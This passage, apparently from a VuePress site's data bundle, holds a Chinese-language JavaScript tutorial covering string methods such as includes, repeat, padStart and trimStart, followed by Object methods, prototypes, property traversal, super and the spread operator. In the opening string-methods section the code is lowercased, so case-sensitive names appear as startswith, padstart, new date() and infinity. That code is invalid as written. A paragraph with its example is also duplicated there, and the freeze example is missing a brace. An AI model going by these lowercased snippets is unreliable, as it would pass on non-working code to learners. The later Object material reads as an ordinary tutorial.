//[\"o\", index: 4, input: \"hello world\", groups: undefined]\nstr.match(/o/g); // (2) [\"o\", \"o\"]\n\n\n\n# str.matchall()\n\n\n# str.concat('a', 'b', 'c')\n\n * 功能： 用于连接两个或多个字符串, 与数组中的concat方法很象，不会修改原字符串\n * 参数： 多个字符串\n * 返回值：拼接之后的长字符串\n\n\n# str.includes() startswith(), endswith()\n\n> 传统上，javascript 只有indexof方法，可以用来确定一个字符串是否包含在另一个字符串中。es6 又提供了三种新方法,方法区分大小写。\n\n * includes()：返回布尔值，表示是否找到了参数字符串。\n * startswith()：返回布尔值，表示参数字符串是否在原字符串的头部。\n * endswith()：返回布尔值，表示参数字符串是否在原字符串的尾部。\n\nlet s = 'hello world!';\n\ns.startswith('hello') // true\ns.endswith('!') // true\ns.includes('o') // true\n\n\n这三个方法都支持第二个参数，表示开始搜索的位置。\n\nlet s = 'hello world!';\n\ns.startswith('hello') // true\ns.endswith('!') // true\ns.includes('o') // true\n\n\n这三个方法都支持第二个参数，表示开始搜索的位置。\n\nlet s = 'hello world!';\n\ns.startswith('world', 6) // true\ns.endswith('hello', 5) // true\ns.includes('hello', 6) // false\n\n\n上面代码表示，使用第二个参数n时，endswith的行为与其他两个方法有所不同。它针对前n个字符，而其他两个方法针对从第n个位置直到字符串结束。\n\n> 查找字符串是否包含 \"runoob\": 如果找到匹配的字符串则返回 true，否则返回 false。\n\nvar str = \"hello world, welcome to the runoob。\";\nvar n = str.includes(\"world\");\n\n\n\n# str.repeat()\n\n * repeat方法返回一个新字符串，表示将原字符串重复n次。\n\n'x'.repeat(3) // \"xxx\"\n'hello'.repeat(2) // \"hellohello\"\n'na'.repeat(0) // \"\"\n\n// 参数如果是小数，会被取整。\n'na'.repeat(2.9) // \"nana\"\n// 如果repeat的参数是负数或者infinity，会报错。\n'na'.repeat(infinity)\n// rangeerror\n'na'.repeat(-1)\n// rangeerror\n\n\n\n\n\n# str.padstart() 、str.padend()\n\n * 功能： 向字符串开头(padstart)或结尾(padend)添加字符，使字符串达到指定的长度。返回在原字符串开头或末尾填充指定的填充字符串直到目标长度所形成的新字符串\n * 参数1: 当前字符串需要填充到的目标长度。如果这个数值小于当前字符串的长度，则返回当前字符串本身。\n * 参数2: （可选）填充字符串。如果字符串太长，使填充后的字符串长度超过了目标长度，则只保留最左侧的部分，其他部分会被截断。\n * 注意事项\n   * 不写第二个参数填充字符串，则默认用空格填充\n   * 填充字符串会自动重复直到达到目标长度\n   * 如果原字符串长度已经大于等于目标长度，则直接返回原字符串\n\n'abc'.padstart(10); // \"       abc\"\n'abc'.padstart(10, \"123\"); // \"1231231abc\"\n'abc'.padstart(6, \"123465\"); // \"123abc\"\n'abc'.padstart(8, \"0\"); // \"00000abc\"\n'abc'.padstart(1); // \"abc\"\n\n'abc'.padend(10); // \"abc       \"\n'abc'.padend(10, \"123\"); // \"abc1231231\"\n'abc'.padend(6, \"123465\"); // \"abc123\"\n'abc'.padend(8, \"0\"); // \"abc00000\"\n'abc'.padend(1); // \"abc\"\n\n\n * 使用场景：得到具有固定长度的数据 （时间、二进制数、十六进制数）\n\n// 获取时间，如果只有一位则前面用0填充\nvar time = new date();\nvar h = string(time.gethours()).padstart(2, '0')\nvar m = string(time.getminutes()).padstart(2, '0')\nvar s = string(time.getseconds()).padstart(2, '0')\nconsole.log( `${h}:${m}:${s}` ) // 18:09:03\n\n\n\n# 实例方法：trimstart()，trimend()\n\n> es2019 对字符串实例新增了trimstart()和trimend()这两个方法。它们的行为与trim()一致，trimstart()消除字符串头部的空格，trimend()消除尾部的空格。它们返回的都是新字符串，不会修改原始字符串。\n\nconst s = '  abc  ';\n\ns.trim() // \"abc\"\ns.trimstart() // \"abc  \"\ns.trimend() // \"  abc\"\n",charsets:{cjk:!0}},{title:"JavaScript 对象的分类",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/05-Object%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/Javascript基础语法/07-对象/05-Object对象.md",key:"v-b6d0b054",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/05-Object%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"Object的属性",slug:"object的属性",normalizedTitle:"object的属性",charIndex:223},{level:2,title:"Object的方法",slug:"object的方法",normalizedTitle:"object的方法",charIndex:341},{level:3,title:"Object.assign(obj1,obj2,obj3,......)",slug:"object-assign-obj1-obj2-obj3",normalizedTitle:"object.assign(obj1,obj2,obj3,......)",charIndex:355},{level:3,title:"Object.is(a,b);",slug:"object-is-a-b",normalizedTitle:"object.is(a,b);",charIndex:1111},{level:3,title:"obj.prototype.isPrototypeOf(b);",slug:"obj-prototype-isprototypeof-b",normalizedTitle:"obj.prototype.isprototypeof(b);",charIndex:1516},{level:3,title:"Object.defineProperty()",slug:"object-defineproperty",normalizedTitle:"object.defineproperty()",charIndex:1667},{level:3,title:"Object.defineProperties()",slug:"object-defineproperties",normalizedTitle:"object.defineproperties()",charIndex:2081},{level:3,title:"Object.freeze(obj)",slug:"object-freeze-obj",normalizedTitle:"object.freeze(obj)",charIndex:2785},{level:3,title:"_proto_属性，Object.setPrototypeOf()，Object.getPrototypeOf()",slug:"proto-属性-object-setprototypeof-object-getprototypeof",normalizedTitle:"_proto_属性，object.setprototypeof()，object.getprototypeof()",charIndex:null},{level:3,title:"Object.getOwnPropertyDescriptor()",slug:"object-getownpropertydescriptor",normalizedTitle:"object.getownpropertydescriptor()",charIndex:5960},{level:3,title:"Object.getOwnPropertyDescriptors()",slug:"object-getownpropertydescriptors",normalizedTitle:"object.getownpropertydescriptors()",charIndex:6296},{level:2,title:"ES6对象的遍历",slug:"es6对象的遍历",normalizedTitle:"es6对象的遍历",charIndex:6420},{level:3,title:"1. for in 循环",slug:"_1-for-in-循环",normalizedTitle:"1. for in 循环",charIndex:6433},{level:3,title:"2. Object.keys(obj)",slug:"_2-object-keys-obj",normalizedTitle:"2. object.keys(obj)",charIndex:6613},{level:3,title:"3. Object.getOwnPropertyNames(obj);",slug:"_3-object-getownpropertynames-obj",normalizedTitle:"3. object.getownpropertynames(obj);",charIndex:7123},{level:3,title:"4. Object.getOwnPropertySymbols(obj);",slug:"_4-object-getownpropertysymbols-obj",normalizedTitle:"4. object.getownpropertysymbols(obj);",charIndex:7209},{level:3,title:"5. Reflect.ownKeys(obj);",slug:"_5-reflect-ownkeys-obj",normalizedTitle:"5. reflect.ownkeys(obj);",charIndex:7280},{level:3,title:"6. Object.values(obj)",slug:"_6-object-values-obj",normalizedTitle:"6. object.values(obj)",charIndex:7358},{level:3,title:"7 Object.create();",slug:"_7-object-create",normalizedTitle:"7 object.create();",charIndex:7714},{level:3,title:"8 Object.entries()",slug:"_8-object-entries",normalizedTitle:"8 object.entries()",charIndex:8186},{level:3,title:"9 Object.fromEntries()",slug:"_9-object-fromentries",normalizedTitle:"9 object.fromentries()",charIndex:8689},{level:2,title:"对象的扩展",slug:"对象的扩展",normalizedTitle:"对象的扩展",charIndex:8909},{level:3,title:"属性的简洁表示法",slug:"属性的简洁表示法",normalizedTitle:"属性的简洁表示法",charIndex:8919},{level:3,title:"方法的简写",slug:"方法的简写",normalizedTitle:"方法的简写",charIndex:9197},{level:3,title:"属性名表达式",slug:"属性名表达式",normalizedTitle:"属性名表达式",charIndex:9540},{level:3,title:"方法的 name 属性",slug:"方法的-name-属性",normalizedTitle:"方法的 name 属性",charIndex:10468},{level:3,title:"属性的可枚举性和遍历",slug:"属性的可枚举性和遍历",normalizedTitle:"属性的可枚举性和遍历",charIndex:11411},{level:3,title:"super 关键字",slug:"super-关键字",normalizedTitle:"super 关键字",charIndex:12187},{level:3,title:"对象的扩展运算符",slug:"对象的扩展运算符",normalizedTitle:"对象的扩展运算符",charIndex:13175},{level:3,title:"解构赋值",slug:"解构赋值",normalizedTitle:"解构赋值",charIndex:13205},{level:3,title:"扩展运算符",slug:"扩展运算符",normalizedTitle:"扩展运算符",charIndex:13178}],headersStr:"Object的属性 Object的方法 Object.assign(obj1,obj2,obj3,......) Object.is(a,b); obj.prototype.isPrototypeOf(b); Object.defineProperty() Object.defineProperties() Object.freeze(obj) _proto_属性，Object.setPrototypeOf()，Object.getPrototypeOf() Object.getOwnPropertyDescriptor() Object.getOwnPropertyDescriptors() ES6对象的遍历 1. for in 循环 2. Object.keys(obj) 3. Object.getOwnPropertyNames(obj); 4. Object.getOwnPropertySymbols(obj); 5. Reflect.ownKeys(obj); 6. Object.values(obj) 7 Object.create(); 8 Object.entries() 9 Object.fromEntries() 对象的扩展 属性的简洁表示法 方法的简写 属性名表达式 方法的 name 属性 属性的可枚举性和遍历 super 关键字 对象的扩展运算符 解构赋值 扩展运算符",content:"# JavaScript 对象的分类\n\n 1. 内置对象：ECMAScript内置的对象，直接拿来用就可以，不需要实例化\n    * 内置顶层对象(global): Math;\n 2. 本地对象:需要实例化才能用\n    * String;\n    * Boolean;\n    * Number;\n    * Function;\n    * Array;\n 3. 宿主对象: BOM DOM\n    \n    > 宿主：js的执行环境\n\n\n# Object的属性\n\n 1. constructor：是对构造函数的引用。\n 2. prototype：是对函数对象的原型引用\n    * 是函数对象的默认属性。\n    * 可以将对象的共有属性存放到原型上，也可以实现继承。\n\n\n# Object的方法\n\n\n# Object.assign(obj1,obj2,obj3,......)\n\n> 可用于对象的拼接，将obj2，obj3......拼接到对象obj1上，并将obj1返回，obj1改变，其他对象不变。\n\nvar obj1={name:'张三'};\nvar obj2={age:18};\nvar obj3={say:function(){\n  console.log('说话');\n}}\nconsole.log(Object.assign(obj1,obj2,obj3));    //{name: \"张三\", age: 18, say: ƒ}\nconsole.log(obj1,obj2);                   // {name: \"张三\", age: 18, say: ƒ}   {age: 18}\n\n\n * 特殊用法： 对象拷贝：\n\n// 将对象obj拷贝到newObj\nvar obj = {name: '张三', age: 20};\n\nvar newObj = Object.assign({},obj);\n\n\nWARNING\n\n（1）浅拷贝 Object.assign()方法实行的是浅拷贝，而不是深拷贝。也就是说，如果源对象某个属性的值是对象，那么目标对象拷贝得到的是这个对象的引用。 （2）同名属性的替换 对于这种嵌套的对象，一旦遇到同名属性，Object.assign()的处理方法是替换，而不是添加。\n\nconst target = { a: { b: 'c', d: 'e' } }\nconst source = { a: { b: 'hello' } }\nObject.assign(target, source)\n// { a: { b: 'hello' } }\n\n\n\n# Object.is(a,b);\n\n> 用于判断两个值是否相同,与===类似，但又不完全一样\n\nObject.is(+0,-0);               //false\nObject.is(NaN,NaN);               //true\n\n\nObject.defineProperty(Object, 'is', {\n  value: function(x, y) {\n    if (x === y) {\n      // 针对+0 不等于 -0的情况\n      return x !== 0 || 1 / x === 1 / y;\n    }\n    // 针对NaN的情况\n    return x !== x && y !== y;\n  },\n  configurable: true,\n  enumerable: false,\n  writable: true\n});\n\n\n\n# obj.prototype.isPrototypeOf(b);\n\n> 确定一个对象是否存在于另一个对象的原型链中\n\nfunction a(){\n}\nvar b = new a();\nconsole.log(a.prototype.isPrototypeOf(b));      //true\n\n\n\n# Object.defineProperty()\n\n> 直接在一个对象上定义一个新属性，或者修改一个对象的现有属性， 并返回这个对象。如果不指定configurable, writable, enumerable ，则这些属性默认值为false，如果不指定value, get, set，则这些属性默认值为undefined\n\n语法: Object.defineProperty(obj, prop, descriptor)\n\nvar obj = new Object();\nObject.defineProperty(obj, 'name', {\n    configurable: false,\n    writable: true,\n    enumerable: true,           //该属性是否可枚举\n    value: '张三'\n})\nconsole.log(obj.name)  //张三\n\n\n\n# Object.defineProperties()\n\n> 直接在一个对象上定义一个或多个新的属性或修改现有属性，并返回该对象。\n\n语法: Object.defineProperties(obj, props)\nprops数据描述：\n\n * value: 属性对应的值,可以使任意类型的值，默认为 undefined\n * configurable: 是否可以删除目标属性或是否可以再次修改属性的特性（writable, configurable, enumerable）。设置为true可以被删除或可以重新设置特性；设置为false，不能被可以被删除或不可以重新设置特性。默认为false。\n * writable: 属性的值是否可以被重写。设置为true可以被重写。默认为false。\n * enumerable: 属性是否可以被枚举(使用for...in或Object.keys())。设置为true可以被枚举。默认为false。\n\nvar obj = new Object();\nObject.defineProperties(obj, {\n    name: {\n        value: '张三',\n        configurable: false,\n        writable: true,\n        enumerable: true\n    },\n    age: {\n        value: 18,\n        configurable: true\n    }\n})\nconsole.log(obj.name, obj.age) // 张三, 18\n\n\n\n# Object.freeze(obj)\n\n> 阻止修改现有属性的特性和值，并阻止添加新属性。\n\nvar obj={name:'张三',age:18};\nObject.freeze(obj)\nobj.name='李四';\nobj.sex='男';\nconsole.log(obj)                //{name: \"张三\", age: 18}\n\n\n用途：用const声明的对象属性方法任然可修改，可以利用这个方法将对象彻底冻结，使其符合const变量的含义\n\nvar obj = {\n    name:\"zhangsan\",\n    age: 20\nObject.freeze(obj)\nobj.name = \"lisi\"\nconsole.log(obj.name)     // \"zhangsan\"\n\n\n\n# __proto__属性，Object.setPrototypeOf()，Object.getPrototypeOf()\n\n> JavaScript 语言的对象继承是通过原型链实现的。ES6 提供了更多原型对象的操作方法\n\n# __proto__属性（前后各两个下划线），用来读取或设置当前对象的原型对象（prototype）。目前，所有浏览器（包括 IE11）都部署了这个属性\n\n// es5 的写法\nconst obj = {\n  method: function() { ... }\n};\nobj.__proto__ = someOtherObj; //不建议\n\n// es6 的写法\nvar obj = Object.create(someOtherObj);\nobj.method = function() { ... };\n\n\n实现上，__proto__调用的是Object.prototype.__proto__\n\nObject.defineProperty(Object.prototype, '__proto__', {\n  get() {\n    let _thisObj = Object(this);\n    return Object.getPrototypeOf(_thisObj);\n  },\n  set(proto) {\n    if (this === undefined || this === null) {\n      throw new TypeError();\n    }\n    if (!isObject(this)) {\n      return undefined;\n    }\n    if (!isObject(proto)) {\n      return undefined;\n    }\n    let status = Reflect.setPrototypeOf(this, proto);\n    if (!status) {\n      throw new TypeError();\n    }\n  },\n});\n\nfunction isObject(value) {\n  return Object(value) === value;\n}\n\n\n\nTIP\n\n如果一个对象本身部署了__proto__属性，该属性的值就是对象的原型。\n\n# Object.setPrototypeOf\n\n> Object.setPrototypeOf方法的作用与__proto__相同，用来设置一个对象的原型对象（prototype），返回参数对象本身。它是 ES6 正式推荐的设置原型对象的方法。\n\n// 格式\nObject.setPrototypeOf(object, prototype)\n\n// 用法\nconst o = Object.setPrototypeOf({}, null);\n\n// 等于\n\nfunction setPrototypeOf(obj, proto) {\n  obj.__proto__ = proto;\n  return obj;\n}\n\n\n如果第一个参数不是对象，会自动转为对象。但是由于返回的还是第一个参数，所以这个操作不会产生任何效果\n\nObject.setPrototypeOf(1, {}) === 1 // true\nObject.setPrototypeOf('foo', {}) === 'foo' // true\nObject.setPrototypeOf(true, {}) === true // true\n// 由于undefined和null无法转为对象，所以如果第一个参数是undefined或null，就会报错。\nObject.setPrototypeOf(undefined, {})\n// TypeError: Object.setPrototypeOf called on null or undefined\nObject.setPrototypeOf(null, {})\n// TypeError: Object.setPrototypeOf called on null or undefined\n\n\n# Object.getPrototypeOf()\n\n> 该方法与Object.setPrototypeOf方法配套，用于读取一个对象的原型对象。\n\nfunction Rectangle() {\n  // ...\n}\n\nconst rec = new Rectangle();\n\nObject.getPrototypeOf(rec) === Rectangle.prototype\n// true\n\nObject.setPrototypeOf(rec, Object.prototype);\nObject.getPrototypeOf(rec) === Rectangle.prototype\n// false\n\n\n\n如果参数不是对象，会被自动转为对象。\n\n// 等同于 Object.getPrototypeOf(Number(1))\nObject.getPrototypeOf(1)\n// Number {[[PrimitiveValue]]: 0}\n\n// 等同于 Object.getPrototypeOf(String('foo'))\nObject.getPrototypeOf('foo')\n// String {length: 0, [[PrimitiveValue]]: \"\"}\n\n// 等同于 Object.getPrototypeOf(Boolean(true))\nObject.getPrototypeOf(true)\n// Boolean {[[PrimitiveValue]]: false}\n\nObject.getPrototypeOf(1) === Number.prototype // true\nObject.getPrototypeOf('foo') === String.prototype // true\nObject.getPrototypeOf(true) === Boolean.prototype // true\n\n// 如果参数是undefined或null，它们无法转为对象，所以会报错。\nObject.getPrototypeOf(null)\n// TypeError: Cannot convert undefined or null to object\n\nObject.getPrototypeOf(undefined)\n// TypeError: Cannot convert undefined or null to object\n\n\n\n# Object.getOwnPropertyDescriptor()\n\n> 方法返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）\n\nconst object1 = {\n  property1: 42\n};\nconst descriptor1 = Object.getOwnPropertyDescriptor(object1, 'property1');\n\nconsole.log(descriptor1.configurable);\n// expected output: true\n\nconsole.log(descriptor1.value);\n// expected output: 42\n\n\n\n# Object.getOwnPropertyDescriptors()\n\n> 方法用来获取一个对象的所有自身属性的描述符。\n\n * 参数 obj 任意对象\n * 返回值 所指定对象的所有自身属性的描述符，如果没有任何自身属性，则返回空对象。\n\n\n# ES6对象的遍历\n\n\n# 1. for in 循环\n\n> 循环遍历对象自身的和继承的可枚举属性(不含Symbol属性).\n\nvar obj={\n  name:'小米',\n  age:18,\n  say:function(){\n    console.log('你好');\n  }\n}\nfor (var i in obj) {\n  console.log(obj[i]);\n}\n\n\n\n# 2. Object.keys(obj)\n\n> 返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名。\n\nvar obj = {'a':'123','b':'345'};\nconsole.log(Object.keys(obj));  //['a','b']\n\n// 如果键名是数字，则按从小到大排列\nvar obj1 = { 100: \"a\", 2: \"b\", 7: \"c\"};\nconsole.log(Object.keys(obj1)); // console: [\"2\", \"7\", \"100\"]\n\nvar obj2 = Object.create({}, { getFoo : { value : function () { return this.foo } } });\nobj2.foo = 1;\nconsole.log(Object.keys(obj2)); // [\"foo\"]\n\n\n> 由于 for...in会遍历出继承的属性，使问题复杂化，大多数时候，我们只关心对象自身的属性。所以，尽量不要用for...in循环，而用Object.keys()代替。\n\n\n# 3. Object.getOwnPropertyNames(obj);\n\n> 返回一个数组,包含对象自身的所有属性(不含Symbol属性,但是包括不可枚举属性).\n\n\n# 4. Object.getOwnPropertySymbols(obj);\n\n> 返回一个数组，包含对象自身的所有Symbol属性。\n\n\n# 5. Reflect.ownKeys(obj);\n\n> 返回一个数组,包含对象自身的所有属性,不管属性名是Symbol或字符串,也不管是否可枚举.\n\n\n# 6. Object.values(obj)\n\n> 方法返回一个给定对象自身的所有可枚举属性值的数组，值的顺序与使用for...in循环的顺序相同( 区别在于 for-in 循环枚举原型链中的属性 )。过滤属性名为 Symbol 值的属性\n\nvar obj = { name: 'zhangsan', age: 20 };\nconsole.log(Object.values(obj)); // ['zhangsan', 20]\n\n\n如果参数不是对象，Object.values会先将其转为对象。由于数值和布尔值的包装对象，都不会为实例添加非继承的属性。所以，Object.values会返回空数组。\n\nObject.values(42) // []\nObject.values(true) // []\n\n\n\n# 7 Object.create();\n\n> 方法创建一个新对象，使用现有的对象来提供新创建的对象的__proto__。\n\nconst person = {\n  isHuman: false,\n  printIntroduction: function() {\n    console.log(`My name is ${this.name}. Am I human? ${this.isHuman}`);\n  }\n};\nconst me = Object.create(person);\nme.name = 'Matthew'; // \"name\" is a property set on \"me\", but not on \"person\"\nme.isHuman = true; // inherited properties can be overwritten\nme.printIntroduction();\n// expected output: \"My name is Matthew. Am I human? true\"\n\n\n\n# 8 Object.entries()\n\n> 方法返回一个给定对象自身可枚举属性的键值对数组，其排列与使用 for...in 循环遍历该对象时返回的顺序一致（区别在于 for-in 循环还会枚举原型链中的属性）。过滤属性名为 Symbol 值的属性\n\nconst object1 = {\n  a: 'somestring',\n  b: 42\n};\n\nfor (const [key, value] of Object.entries(object1)) {\n  console.log(`${key}: ${value}`);\n}\n// expected output:\n// \"a: somestring\"\n// \"b: 42\"\n// order is not guaranteed\n\n\nObject.entries方法的另一个用处是，将对象转为真正的Map结构。\n\nconst obj = { foo: 'bar', baz: 42 };\nconst map = new Map(Object.entries(obj));\nmap // Map { foo: \"bar\", baz: 42 }\n\n\n\n# 9 Object.fromEntries()\n\n> 方法把键值对列表转换为一个对象\n\nconst entries = new Map([\n  ['foo', 'bar'],\n  ['baz', 42]\n]);\nconst obj = Object.fromEntries(entries);\nconsole.log(obj);\n// expected output: Object { foo: \"bar\", baz: 42 }\n\n\n\n# 对象的扩展\n\n\n# 属性的简洁表示法\n\n> ES6 允许在大括号里面，直接写入变量和函数，作为对象的属性和方法。这样的书写更加简洁。\n\nconst foo = 'bar';\nconst baz = {foo};\nbaz // {foo: \"bar\"}\n\n// 等同于\nconst baz = {foo: foo};\n\n\nfunction f(x, y) {\n  return {x, y};\n}\n\n// 等同于\n\nfunction f(x, y) {\n  return {x: x, y: y};\n}\n\nf(1, 2) // Object {x: 1, y: 2}\n\n\n\n# 方法的简写\n\nWARNING\n\n注意，简写的对象方法不能用作构造函数，会报错。\n\nconst o = {\n  method() {\n    return \"Hello!\";\n  }\n};\n\n// 等同于\n\nconst o = {\n  method: function() {\n    return \"Hello!\";\n  }\n};\n\nlet birth = '2000/01/01';\n\nconst Person = {\n\n  name: '张三',\n\n  //等同于birth: birth\n  birth,\n\n  // 等同于hello: function ()...\n  hello() { console.log('我的名字是', this.name); }\n\n};\n\n\n\n# 属性名表达式\n\n> JavaScript 定义对象的属性，有两种方法。\n\nconst obj = {};\n// 方法一\nobj.foo = true;\n\n// 方法二\nobj['a' + 'bc'] = 123;\n\n\nlet propKey = 'foo';\n\nlet obj = {\n[propKey]: true,\n['a' + 'bc']: 123\n};\n\nlet lastWord = 'last word';\n\nconst a = {\n'first word': 'hello',\n[lastWord]: 'world'\n};\n\na['first word'] // \"hello\"\na[lastWord] // \"world\"\na['last word'] // \"world\"\n\n\n\n> 表达式还可以用于定义方法名。\n\nlet obj = {\n  ['h' + 'ello']() {\n    return 'hi';\n  }\n};\n\nobj.hello() // hi\n\n\nWARNING\n\n注意，属性名表达式与简洁表示法，不能同时使用，会报错。\n\n// 报错\nconst foo = 'bar';\nconst bar = 'abc';\nconst baz = { [foo] };\n\n// 正确\nconst foo = 'bar';\nconst baz = { [foo]: 'abc'};\n\n\nWARNING\n\n属性名表达式如果是一个对象，默认情况下会自动将对象转为字符串[object Object]，这一点要特别小心。\n\nconst keyA = {a: 1};\nconst keyB = {b: 2};\n\nconst myObject = {\n  [keyA]: 'valueA',\n  [keyB]: 'valueB'\n};\n\nmyObject // Object {[object Object]: \"valueB\"}\n\n// 上面代码中，[keyA]和[keyB]得到的都是[object Object]，所以[keyB]会把[keyA]覆盖掉，而myObject最后只有一个[object Object]属性。\n\n\n\n# 方法的 name 属性\n\n> 函数的name属性，返回函数名。对象方法也是函数，因此也有name属性。\n\nconst person = {\n  sayName() {\n    console.log('hello!');\n  },\n};\n\nperson.sayName.name   // \"sayName\"\n\n\n> 如果对象的方法使用了取值函数（getter）和存值函数（setter），则name属性不是在该方法上面，而是该方法的属性的描述对象的get和set属性上面，返回值是方法名前加上get和set。\n\nconst obj = {\n  get foo() {},\n  set foo(x) {}\n};\n\nobj.foo.name\n// TypeError: Cannot read property 'name' of undefined\n\nconst descriptor = Object.getOwnPropertyDescriptor(obj, 'foo');\n\ndescriptor.get.name // \"get foo\"\ndescriptor.set.name // \"set foo\"\n\n\nWARNING\n\n有两种特殊情况：bind方法创造的函数，name属性返回bound加上原函数的名字；Function构造函数创造的函数，name属性返回anonymous。\n\n(new Function()).name // \"anonymous\"\n\nvar doSomething = function() {\n  // ...\n};\ndoSomething.bind().name // \"bound doSomething\"\n\n\n> 如果对象的方法是一个 Symbol 值，那么name属性返回的是这个 Symbol 值的描述。\n\nconst key1 = Symbol('description');\nconst key2 = Symbol();\nlet obj = {\n  [key1]() {},\n  [key2]() {},\n};\nobj[key1].name // \"[description]\"\nobj[key2].name // \"\"\n\n\n\n# 属性的可枚举性和遍历\n\nES6 一共有 5 种方法可以遍历对象的属性。\n\n（1）for...in\n\nfor...in循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性）。\n\n（2）Object.keys(obj)\n\nObject.keys返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名。\n\n（3）Object.getOwnPropertyNames(obj)\n\nObject.getOwnPropertyNames返回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）的键名。\n\n（4）Object.getOwnPropertySymbols(obj)\n\nObject.getOwnPropertySymbols返回一个数组，包含对象自身的所有 Symbol 属性的键名。\n\n（5）Reflect.ownKeys(obj)\n\nReflect.ownKeys返回一个数组，包含对象自身的（不含继承的）所有键名，不管键名是 Symbol 或字符串，也不管是否可枚举。\n\n以上的 5 种方法遍历对象的键名，都遵守同样的属性遍历的次序规则。\n\n首先遍历所有数值键，按照数值升序排列。 其次遍历所有字符串键，按照加入时间升序排列。 最后遍历所有 Symbol 键，按照加入时间升序排列。\n\nReflect.ownKeys({ [Symbol()]:0, b:0, 10:0, 2:0, a:0 })\n// ['2', '10', 'b', 'a', Symbol()]\n\n\n上面代码中，Reflect.ownKeys方法返回一个数组，包含了参数对象的所有属性。这个数组的属性次序是这样的，首先是数值属性2和10，其次是字符串属性b和a，最后是 Symbol 属性。\n\n\n# super 关键字\n\n> this关键字总是指向函数所在的当前对象，ES6 又新增了另一个类似的关键字super，指向当前对象的原型对象。\n\nconst proto = {\n  foo: 'hello'\n};\n\nconst obj = {\n  foo: 'world',\n  find() {\n    return super.foo;\n  }\n};\n\nObject.setPrototypeOf(obj, proto);\nobj.find() // \"hello\"\n\n\nWARNING\n\n注意，super关键字表示原型对象时，只能用在对象的方法之中，用在其他地方都会报错\n\n// 报错\nconst obj = {\n  foo: super.foo\n}\n\n// 报错\nconst obj = {\n  foo: () => super.foo\n}\n\n// 报错\nconst obj = {\n  foo: function () {\n    return super.foo\n  }\n}\n\n\n> 上面三种super的用法都会报错，因为对于 JavaScript 引擎来说，这里的super都没有用在对象的方法之中。第一种写法是super用在属性里面，第二种和第三种写法是super用在一个函数里面，然后赋值给foo属性。目前，只有对象方法的简写法可以让 JavaScript 引擎确认，定义的是对象的方法\n\nTIP\n\nJavaScript 引擎内部，super.foo等同于Object.getPrototypeOf(this).foo（属性）或Object.getPrototypeOf(this).foo.call(this)（方法）。\n\nconst proto = {\n  x: 'hello',\n  foo() {\n    console.log(this.x);\n  },\n};\n\nconst obj = {\n  x: 'world',\n  foo() {\n    super.foo();\n  }\n}\n\nObject.setPrototypeOf(obj, proto);\n\nobj.foo() // \"world\"\n\n\n> 上面代码中，super.foo指向原型对象proto的foo方法，但是绑定的this却还是当前对象obj，因此输出的就是world。\n\n\n# 对象的扩展运算符\n\n> 与数组的结构扩展运算符类似\n\n\n# 解构赋值\n\n> 对象的解构赋值用于从一个对象取值，相当于将目标对象自身的所有可遍历的（enumerable）、但尚未被读取的属性，分配到指定的对象上面。所有的键和它们的值，都会拷贝到新对象上面。\n\nlet { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };\nx // 1\ny // 2\nz // { a: 3, b: 4 }\n\n// 变量z是解构赋值所在的对象。它获取等号右边的所有尚未读取的键（a和b），将它们连同值一起拷贝过来。\n\n\n> 由于解构赋值要求等号右边是一个对象，所以如果等号右边是undefined或null，就会报错，因为它们无法转为对象。\n\nlet { ...z } = null; // 运行时错误\nlet { ...z } = undefined; // 运行时错误\n\n\n> 解构赋值必须是最后一个参数，否则会报错。\n\nlet { ...x, y, z } = someObject; // 句法错误\nlet { x, ...y, ...z } = someObject; // 句法错误\n\n\nWARNING\n\n注意，解构赋值的拷贝是浅拷贝，即如果一个键的值是复合类型的值（数组、对象、函数）、那么解构赋值拷贝的是这个值的引用，而不是这个值的副本。\n\nlet obj = { a: { b: 1 } };\nlet { ...x } = obj;\nobj.a.b = 2;\nx.a.b // 2\n// 上面代码中，对象o3复制了o2，但是只复制了o2自身的属性，没有复制它的原型对象o1的属性。\n\n\nconst o = Object.create({ x: 1, y: 2 });\no.z = 3;\n\nlet { x, ...newObj } = o;\nlet { y, z } = newObj;\nx // 1\ny // undefined\nz // 3\n\n// 变量x是单纯的解构赋值，所以可以读取对象o继承的属性；变量y和z是扩展运算符的解构赋值，只能读取对象o自身的属性，所以变量z可以赋值成功，变量y取不到值。ES6 规定，变量声明语句之中，如果使用解构赋值，扩展运算符后面必须是一个变量名，而不能是一个解构赋值表达式，所以上面代码引入了中间变量newObj，如果写成下面这样会报错。\n\n\nlet { x, ...{ y, z } } = o;\n// SyntaxError: ... must be followed by an identifier in declaration contexts\n\n\n> 解构赋值的一个用处，是扩展某个函数的参数，引入其他操作。\n\nfunction baseFunction({ a, b }) {\n  // ...\n}\nfunction wrapperFunction({ x, y, ...restConfig }) {\n  // 使用 x 和 y 参数进行操作\n  // 其余参数传给原始函数\n  return baseFunction(restConfig);\n}\n\n\n\n# 扩展运算符\n\n对象的扩展运算符（...）用于取出参数对象的所有可遍历属性，拷贝到当前对象之中。\n\nlet z = { a: 3, b: 4 };\nlet n = { ...z };\nn // { a: 3, b: 4 }\n\n\n由于数组是特殊的对象，所以对象的扩展运算符也可以用于数组。\n\nlet foo = { ...['a', 'b', 'c'] };\nfoo\n// {0: \"a\", 1: \"b\", 2: \"c\"}\n\n\n如果扩展运算符后面是一个空对象，则没有任何效果。\n\n{...{}, a: 1}\n// { a: 1 }\n\n\n如果扩展运算符后面不是对象，则会自动将其转为对象。\n\n// 由于该对象没有自身属性，所以返回一个空对象。\n// 等同于 {...Object(1)}\n{...1} // {}\n\n// 等同于 {...Object(true)}\n{...true} // {}\n\n// 等同于 {...Object(undefined)}\n{...undefined} // {}\n\n// 等同于 {...Object(null)}\n{...null} // {}\n\n\n但是，如果扩展运算符后面是字符串，它会自动转成一个类似数组的对象，因此返回的不是空对象。\n\n{...'hello'}\n// {0: 